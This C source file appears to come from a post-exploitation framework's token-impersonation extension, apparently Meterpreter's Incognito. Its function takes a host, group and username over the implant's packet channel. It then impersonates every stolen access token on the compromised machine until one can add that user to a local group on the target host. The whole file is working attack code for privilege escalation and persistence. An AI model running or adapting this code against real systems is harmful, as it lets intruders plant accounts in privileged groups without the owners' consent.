DWORD request_incognito_add_localgroup_user(Remote *remote, Packet *packet)
{
   	DWORD dwLevel = 1, dwError = 0, num_tokens = 0, i;
   	NET_API_STATUS nStatus;
	LOCALGROUP_MEMBERS_INFO_3 localgroup_member;
	SavedToken *token_list = NULL;
	HANDLE saved_token;
	wchar_t dc_netbios_name_u[BUF_SIZE], username_u[BUF_SIZE], groupname_u[BUF_SIZE];
	char *dc_netbios_name, *groupname, *username, return_value[BUF_SIZE] = "", temp[BUF_SIZE] = "";

	// Read arguments
	Packet *response = packet_create_response(packet);
	dc_netbios_name = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
	groupname = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_GROUPNAME);
	username = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_USERNAME);

	mbstowcs(dc_netbios_name_u, dc_netbios_name, strlen(dc_netbios_name)+1);
	mbstowcs(username_u, username, strlen(username)+1);
	mbstowcs(groupname_u, groupname, strlen(groupname)+1);

	localgroup_member.lgrmi3_domainandname = username_u;

	// Save current thread token if one is currently being impersonated
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &saved_token))
		saved_token = INVALID_HANDLE_VALUE;

	token_list = get_token_list(&num_tokens);
	if (!token_list)
	{
		sprintf(return_value, "[-] Failed to enumerate tokens with error code: %d\n", GetLastError());
		goto cleanup;
	}

	sprintf(return_value, "[*] Attempting to add user %s to localgroup %s on host %s\n", username, groupname, dc_netbios_name);

	// Attempt to add user to localgroup with every token
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token)
	{
		// causes major problems (always error 127) once you have impersonated this token once. No idea why!!!
		if (!_stricmp("NT AUTHORITY\\ANONYMOUS LOGON", token_list[i].username))
			continue;

		ImpersonateLoggedOnUser(token_list[i].token);
		nStatus = NetLocalGroupAddMembers(dc_netbios_name_u, groupname_u, 3, (LPBYTE)&localgroup_member, 1);
		RevertToSelf();

   		switch (nStatus)
   		{
			case ERROR_ACCESS_DENIED:
			case ERROR_LOGON_FAILURE: // unknown username or bad password
			case ERROR_INVALID_PASSWORD:
				break;
			case NERR_Success:
				strncat(return_value, "[+] Successfully added user to local group\n", sizeof(return_value)-strlen(return_value)-1);
				goto cleanup;
			case NERR_InvalidComputer:
				strncat(return_value, "[-] Computer name invalid\n", sizeof(return_value)-strlen(return_value)-1);
				goto cleanup;
			case ERROR_NO_SUCH_MEMBER:
				strncat(return_value, "[-] User not found\n", sizeof(return_value)-strlen(return_value)-1);
				goto cleanup;
			case NERR_GroupNotFound:
			case 1376: // found by testing (also group not found)
				strncat(return_value, "[-] Local group not found\n", sizeof(return_value)-strlen(return_value)-1);
				goto cleanup;
			case ERROR_MEMBER_IN_ALIAS:
				strncat(return_value, "[-] User already in group\n", sizeof(return_value)-strlen(return_value)-1);
				goto cleanup;
			default:
				sprintf(temp, "Unknown error: %d \n", nStatus);
				strncat(return_value, temp, sizeof(return_value)-strlen(return_value)-1);
				goto cleanup;
		}
	}

	strncat(return_value, "[-] Access denied with all tokens\n", sizeof(return_value)-strlen(return_value)-1);

cleanup:
	for (i=0;i<num_tokens;i++)
		CloseHandle(token_list[i].token);
	free(token_list);

	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	// Restore token impersonation
	if (saved_token != INVALID_HANDLE_VALUE)
		ImpersonateLoggedOnUser(saved_token);

	return ERROR_SUCCESS;
}